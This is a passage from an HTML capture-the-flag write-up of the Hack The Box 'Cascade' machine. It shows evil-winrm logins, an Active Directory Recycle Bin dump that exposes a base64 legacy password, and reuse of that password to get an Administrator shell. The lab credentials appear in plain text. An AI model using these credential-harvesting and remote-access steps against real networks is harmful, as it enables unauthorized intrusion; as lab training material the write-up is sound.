+</code></pre><h3 id="18bd1b9f-8847-80d2-a55e-c5f79dc0e51f" class="">Your workspace should be look like this</h3><figure id="18bd1b9f-8847-802a-87aa-ecc12dec35f5" class="image"><a href="../img/Cascade/image 1.png"><img style="width:709.984375px" src="../img/Cascade/image 1.png"/></a></figure><h3 id="18bd1b9f-8847-8020-b76c-f0625b100105" class="">Create breakpoint where the pwd is decrypted and other when connections closed</h3><figure id="18bd1b9f-8847-80e0-bd19-d7ea16e48a1f" class="image"><a href="../img/Cascade/image 2.png"><img style="width:709.96875px" src="../img/Cascade/image 2.png"/></a></figure><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18bd1b9f-8847-801b-8d87-dbf797a107b0" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">		password	&quot;w3lc0meFr31nd\0\0\0&quot;	
+</code></pre><h3 id="18bd1b9f-8847-80eb-a1d1-f1cceb2300c5" class="">Got it!</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18bd1b9f-8847-809d-8dab-d9fb8c6e2446" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ evil-winrm -i 10.10.10.182 -u &quot;ArkSvc&quot; -p &#x27;w3lc0meFr31nd&#x27;
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\arksvc\Documents&gt; 
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18bd1b9f-8847-8069-9eb2-f5fd516f7255" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">*Evil-WinRM* PS C:\Users\arksvc\Documents&gt; net user ArkSvc
+User name                    arksvc
+Full Name                    ArkSvc
+Comment
+User&#x27;s comment
+Country code                 000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            1/9/2020 4:18:20 PM
+Password expires             Never
+Password changeable          1/9/2020 4:18:20 PM
+Password required            Yes
+User may change password     No
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   1/29/2020 9:05:40 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *AD Recycle Bin       *IT
+                             *Remote Management Use
+Global Group memberships     *Domain Users
+The command completed successfully.
+</code></pre><h3 id="18bd1b9f-8847-8074-898d-e29b29adf14c" class="">New group “AD Recycle Bin” → “<a href="https://github.com/ivanversluis/pentest-hacktricks/blob/master/windows/active-directory-methodology/privileged-accounts-and-token-privileges.md#ad-recycle-bin">Exploit</a>”</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18bd1b9f-8847-8017-8b1e-f3b5caf8b6e9" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">*Evil-WinRM* PS C:\Users\arksvc\Documents&gt; Get-ADObject -filter &#x27;isDeleted -eq $true&#x27; -includeDeletedObjects -Properties *
+
+
+CanonicalName                   : cascade.local/Deleted Objects
+CN                              : Deleted Objects
+Created                         : 1/9/2020 3:31:39 PM
+createTimeStamp                 : 1/9/2020 3:31:39 PM
+Deleted                         : True
+Description                     : Default container for deleted objects
+DisplayName                     :
+DistinguishedName               : CN=Deleted Objects,DC=cascade,DC=local
+dSCorePropagationData           : {1/1/1601 12:00:00 AM}
+instanceType                    : 4
+isCriticalSystemObject          : True
+isDeleted                       : True
+LastKnownParent                 :
+Modified                        : 1/13/2020 1:21:17 AM
+modifyTimeStamp                 : 1/13/2020 1:21:17 AM
+Name                            : Deleted Objects
+ObjectCategory                  : CN=Container,CN=Schema,CN=Configuration,DC=cascade,DC=local
+ObjectClass                     : container
+ObjectGUID                      : 51de9801-3625-4ac2-a605-d6bd71617681
+ProtectedFromAccidentalDeletion :
+sDRightsEffective               : 0
+showInAdvancedViewOnly          : True
+systemFlags                     : -1946157056
+uSNChanged                      : 65585
+uSNCreated                      : 5695
+whenChanged                     : 1/13/2020 1:21:17 AM
+whenCreated                     : 1/9/2020 3:31:39 PM
+
+accountExpires                  : 9223372036854775807
+badPasswordTime                 : 0
+badPwdCount                     : 0
+CanonicalName                   : cascade.local/Deleted Objects/CASC-WS1
+                                  DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
+CN                              : CASC-WS1
+                                  DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
+codePage                        : 0
+countryCode                     : 0
+Created                         : 1/9/2020 7:30:19 PM
+createTimeStamp                 : 1/9/2020 7:30:19 PM
+Deleted                         : True
+Description                     :
+DisplayName                     :
+DistinguishedName               : CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local
+dSCorePropagationData           : {1/17/2020 3:37:36 AM, 1/17/2020 12:14:04 AM, 1/9/2020 7:30:19 PM, 1/1/1601 12:04:17 AM}
+instanceType                    : 4
+isCriticalSystemObject          : False
+isDeleted                       : True
+LastKnownParent                 : OU=Computers,OU=UK,DC=cascade,DC=local
+lastLogoff                      : 0
+lastLogon                       : 0
+localPolicyFlags                : 0
+logonCount                      : 0
+Modified                        : 1/28/2020 6:08:35 PM
+modifyTimeStamp                 : 1/28/2020 6:08:35 PM
+msDS-LastKnownRDN               : CASC-WS1
+Name                            : CASC-WS1
+                                  DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
+nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                  :
+ObjectClass                     : computer
+ObjectGUID                      : 6d97daa4-2e82-4946-a11e-f91fa18bfabe
+objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1108
+primaryGroupID                  : 515
+ProtectedFromAccidentalDeletion : False
+pwdLastSet                      : 132230718192147073
+sAMAccountName                  : CASC-WS1$
+sDRightsEffective               : 0
+userAccountControl              : 4128
+uSNChanged                      : 245849
+uSNCreated                      : 24603
+whenChanged                     : 1/28/2020 6:08:35 PM
+whenCreated                     : 1/9/2020 7:30:19 PM
+
+CanonicalName                   : cascade.local/Deleted Objects/Scheduled Tasks
+                                  DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
+CN                              : Scheduled Tasks
+                                  DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
+Created                         : 1/13/2020 5:21:53 PM
+createTimeStamp                 : 1/13/2020 5:21:53 PM
+Deleted                         : True
+Description                     :
+DisplayName                     :
+DistinguishedName               : CN=Scheduled Tasks\0ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN=Deleted Objects,DC=cascade,DC=local
+dSCorePropagationData           : {1/17/2020 9:35:46 PM, 1/17/2020 9:32:57 PM, 1/17/2020 3:37:36 AM, 1/17/2020 12:14:04 AM...}
+groupType                       : -2147483644
+instanceType                    : 4
+isDeleted                       : True
+LastKnownParent                 : OU=Groups,OU=UK,DC=cascade,DC=local
+Modified                        : 1/28/2020 6:07:55 PM
+modifyTimeStamp                 : 1/28/2020 6:07:55 PM
+msDS-LastKnownRDN               : Scheduled Tasks
+Name                            : Scheduled Tasks
+                                  DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
+nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                  :
+ObjectClass                     : group
+ObjectGUID                      : 13375728-5ddb-4137-b8b8-b9041d1d3fd2
+objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1131
+ProtectedFromAccidentalDeletion : False
+sAMAccountName                  : Scheduled Tasks
+sDRightsEffective               : 0
+uSNChanged                      : 245848
+uSNCreated                      : 114790
+whenChanged                     : 1/28/2020 6:07:55 PM
+whenCreated                     : 1/13/2020 5:21:53 PM
+
+CanonicalName                   : cascade.local/Deleted Objects/{A403B701-A528-4685-A816-FDEE32BDDCBA}
+                                  DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
+CN                              : {A403B701-A528-4685-A816-FDEE32BDDCBA}
+                                  DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
+Created                         : 1/26/2020 2:34:30 AM
+createTimeStamp                 : 1/26/2020 2:34:30 AM
+Deleted                         : True
+Description                     :
+DisplayName                     : Block Potato
+DistinguishedName               : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
+dSCorePropagationData           : {1/1/1601 12:00:00 AM}
+flags                           : 0
+gPCFileSysPath                  : \\cascade.local\SysVol\cascade.local\Policies\{A403B701-A528-4685-A816-FDEE32BDDCBA}
+gPCFunctionalityVersion         : 2
+gPCMachineExtensionNames        : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1D-2488-11D1-A28C-00C04FB94F17}][{B1BE8D72-6EAC-11D2-A4EA-00C04F79F83A}{53D6AB1D-2488-11D1-A28C-00C04FB94F17}]
+instanceType                    : 4
+isDeleted                       : True
+LastKnownParent                 : CN=Policies,CN=System,DC=cascade,DC=local
+Modified                        : 1/26/2020 2:40:52 AM
+modifyTimeStamp                 : 1/26/2020 2:40:52 AM
+msDS-LastKnownRDN               : {A403B701-A528-4685-A816-FDEE32BDDCBA}
+Name                            : {A403B701-A528-4685-A816-FDEE32BDDCBA}
+                                  DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
+nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                  :
+ObjectClass                     : groupPolicyContainer
+ObjectGUID                      : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
+ProtectedFromAccidentalDeletion : False
+sDRightsEffective               : 0
+showInAdvancedViewOnly          : True
+uSNChanged                      : 196701
+uSNCreated                      : 196688
+versionNumber                   : 2
+whenChanged                     : 1/26/2020 2:40:52 AM
+whenCreated                     : 1/26/2020 2:34:30 AM
+
+CanonicalName                   : cascade.local/Deleted Objects/Machine
+                                  DEL:93c23674-e411-400b-bb9f-c0340bda5a34
+CN                              : Machine
+                                  DEL:93c23674-e411-400b-bb9f-c0340bda5a34
+Created                         : 1/26/2020 2:34:31 AM
+createTimeStamp                 : 1/26/2020 2:34:31 AM
+Deleted                         : True
+Description                     :
+DisplayName                     :
+DistinguishedName               : CN=Machine\0ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN=Deleted Objects,DC=cascade,DC=local
+dSCorePropagationData           : {1/1/1601 12:00:00 AM}
+instanceType                    : 4
+isDeleted                       : True
+LastKnownParent                 : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
+Modified                        : 1/26/2020 2:40:52 AM
+modifyTimeStamp                 : 1/26/2020 2:40:52 AM
+msDS-LastKnownRDN               : Machine
+Name                            : Machine
+                                  DEL:93c23674-e411-400b-bb9f-c0340bda5a34
+nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                  :
+ObjectClass                     : container
+ObjectGUID                      : 93c23674-e411-400b-bb9f-c0340bda5a34
+ProtectedFromAccidentalDeletion : False
+sDRightsEffective               : 0
+showInAdvancedViewOnly          : True
+uSNChanged                      : 196699
+uSNCreated                      : 196689
+whenChanged                     : 1/26/2020 2:40:52 AM
+whenCreated                     : 1/26/2020 2:34:31 AM
+
+CanonicalName                   : cascade.local/Deleted Objects/User
+                                  DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
+CN                              : User
+                                  DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
+Created                         : 1/26/2020 2:34:31 AM
+createTimeStamp                 : 1/26/2020 2:34:31 AM
+Deleted                         : True
+Description                     :
+DisplayName                     :
+DistinguishedName               : CN=User\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local
+dSCorePropagationData           : {1/1/1601 12:00:00 AM}
+instanceType                    : 4
+isDeleted                       : True
+LastKnownParent                 : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
+Modified                        : 1/26/2020 2:40:52 AM
+modifyTimeStamp                 : 1/26/2020 2:40:52 AM
+msDS-LastKnownRDN               : User
+Name                            : User
+                                  DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
+nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                  :
+ObjectClass                     : container
+ObjectGUID                      : 746385f2-e3a0-4252-b83a-5a206da0ed88
+ProtectedFromAccidentalDeletion : False
+sDRightsEffective               : 0
+showInAdvancedViewOnly          : True
+uSNChanged                      : 196700
+uSNCreated                      : 196690
+whenChanged                     : 1/26/2020 2:40:52 AM
+whenCreated                     : 1/26/2020 2:34:31 AM
+
+accountExpires                  : 9223372036854775807
+badPasswordTime                 : 0
+badPwdCount                     : 0
+CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
+                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
+CN                              : TempAdmin
+                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+codePage                        : 0
+countryCode                     : 0
+Created                         : 1/27/2020 3:23:08 AM
+createTimeStamp                 : 1/27/2020 3:23:08 AM
+Deleted                         : True
+Description                     :
+DisplayName                     : TempAdmin
+DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
+dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
+givenName                       : TempAdmin
+instanceType                    : 4
+isDeleted                       : True
+LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
+lastLogoff                      : 0
+lastLogon                       : 0
+logonCount                      : 0
+Modified                        : 1/27/2020 3:24:34 AM
+modifyTimeStamp                 : 1/27/2020 3:24:34 AM
+msDS-LastKnownRDN               : TempAdmin
+Name                            : TempAdmin
+                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                  :
+ObjectClass                     : user
+ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
+objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
+primaryGroupID                  : 513
+ProtectedFromAccidentalDeletion : False
+pwdLastSet                      : 132245689883479503
+sAMAccountName                  : TempAdmin
+sDRightsEffective               : 0
+userAccountControl              : 66048
+userPrincipalName               : TempAdmin@cascade.local
+uSNChanged                      : 237705
+uSNCreated                      : 237695
+whenChanged                     : 1/27/2020 3:24:34 AM
+whenCreated                     : 1/27/2020 3:23:08 AM
+
+</code></pre><h3 id="18bd1b9f-8847-80fe-a780-ed2d6394b4e2" class="">Same as Ryan → copying and greping results to file and greping with -iE</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18bd1b9f-8847-8051-8bb5-eb15bd4abfd0" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">CanonicalName                   : cascade.local/Deleted Objects
+DisplayName                     :
+DistinguishedName               : CN=Deleted Objects,DC=cascade,DC=local
+Name                            : Deleted Objects
+badPwdCount                     : 0
+CanonicalName                   : cascade.local/Deleted Objects/CASC-WS1
+DisplayName                     :
+DistinguishedName               : CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local
+Name                            : CASC-WS1
+pwdLastSet                      : 132230718192147073
+sAMAccountName                  : CASC-WS1$
+CanonicalName                   : cascade.local/Deleted Objects/Scheduled Tasks
+DisplayName                     :
+DistinguishedName               : CN=Scheduled Tasks\0ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN=Deleted Objects,DC=cascade,DC=local
+Name                            : Scheduled Tasks
+sAMAccountName                  : Scheduled Tasks
+CanonicalName                   : cascade.local/Deleted Objects/{A403B701-A528-4685-A816-FDEE32BDDCBA}
+DisplayName                     : Block Potato
+DistinguishedName               : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
+gPCMachineExtensionNames        : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1D-2488-11D1-A28C-00C04FB94F17}][{B1BE8D72-6EAC-11D2-A4EA-00C04F79F83A}{53D6AB1D-2488-11D1-A28C-00C04FB94F17}]
+Name                            : {A403B701-A528-4685-A816-FDEE32BDDCBA}
+CanonicalName                   : cascade.local/Deleted Objects/Machine
+DisplayName                     :
+DistinguishedName               : CN=Machine\0ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN=Deleted Objects,DC=cascade,DC=local
+Name                            : Machine
+CanonicalName                   : cascade.local/Deleted Objects/User
+DisplayName                     :
+DistinguishedName               : CN=User\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local
+Name                            : User
+badPwdCount                     : 0
+CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
+cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
+DisplayName                     : TempAdmin
+DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
+givenName                       : TempAdmin
+Name                            : TempAdmin
+pwdLastSet                      : 132245689883479503
+sAMAccountName                  : TempAdmin
+userPrincipalName               : TempAdmin@cascade.local
+                                                            </code></pre><h3 id="18bd1b9f-8847-80e6-93e3-e5e8b1133526" class="">Password encrypted</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18bd1b9f-8847-80d6-8c9b-f484b0818ee6" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
+
+┌──(drroot㉿drroot)-[~/Desktop/.htb/Cascade]
+└─$ echo &quot;YmFDVDNyMWFOMDBkbGVz&quot; | base64 -d                              
+baCT3r1aN00dles  </code></pre><h3 id="18bd1b9f-8847-808e-84c6-f981ff6d6f02" class="">Administrator → The html file said “TempAdmin has the same pwd thad Admin”</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18bd1b9f-8847-80a1-a603-f1ceb6d9307b" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Cascade]
+└─$ evil-winrm -i 10.10.10.182 -u Administrator -p &#x27;baCT3r1aN00dles&#x27;
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami
+cascade\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; type ../Desktop/root.txt
+2******************************8
+</code></pre></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
